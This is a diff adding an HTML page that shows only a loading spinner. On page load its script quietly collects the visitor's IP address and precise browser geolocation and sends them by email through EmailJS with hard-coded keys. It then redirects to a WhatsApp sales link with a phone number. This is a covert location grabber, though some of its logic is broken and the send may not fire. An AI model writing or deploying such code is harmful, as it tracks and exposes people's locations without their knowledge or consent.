@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Display User Info</title>
+    <style>
+        .container {
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            width: 100%;
+        }
+
+        img {
+            height: 3.75em;
+        }
+    </style>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+
+            emailjs.init({
+                publicKey: "7v0F1mQIEfzptL4U6",
+            });
+
+            let ipAddress = '';
+            let latitude = '';
+            let longitude = '';
+            let timezone = '';
+            let currentTime = '';
+            let network = '';
+
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress = data.ip;
+                    timezone = data.timezone;
+                    currentTime = new Date().toLocaleString('en-US', { timeZone: data.timezone });
+                    network = data.org;
+                    console.log(`IP Address: ${ipAddress}\n Timezone: ${timezone}\n Time: ${currentTime}\nNetwork: ${network}`);
+                    sendEmail(ipAddress, latitude, longitude, timezone, currentTime, network);
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                    console.log('Unable to fetch IP address');
+                });
+
+            if ('geolocation' in navigator) {
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                };
+
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        latitude = position.coords.latitude.toString();
+                        longitude = position.coords.longitude.toString();
+                        console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
+                        sendEmail(ipAddress, latitude, longitude);
+                    },
+                    error => {
+                        console.error('Error fetching location:', error);
+                        console.log('Unable to fetch location');
+                    },
+                    options
+                );
+            } else {
+                console.log('Geolocation is not supported by your browser');
+            }
+
+            function sendEmail(ip, lat, long, tz, time, net) {
+                if (ip && lat && long && tz && time && net) {
+                    const templateParams = {
+                        ip_address: ip,
+                        latitude: lat,
+                        longitude: long,
+                        timezone: tz,
+                        current_time: time,
+                        network: net
+                    };
+
+                    emailjs.send('service_o088nnk', 'template_3idcs9p', templateParams)
+                        .then(response => {
+                            console.log('Email sent successfully!', response.status, response.text);
+                        })
+                        .then(() => {
+                            window.location.href = 'https://wa.me/+923021105464?text=Hi%2C+are+you+interested+in+our+product%3F'
+                        })
+                        .catch(error => {
+                            console.error('Error sending email:', error);
+                        });
+                }
+            }
+        });
+    </script>
+</head>
+
+<body>
+    <div class="container">
+        <img src="https://raw.githubusercontent.com/niklausgerber/PreLoadMe/master/img/status.gif" alt="">
+    </div>
+
+    </div>
+</body>
+
+</html>
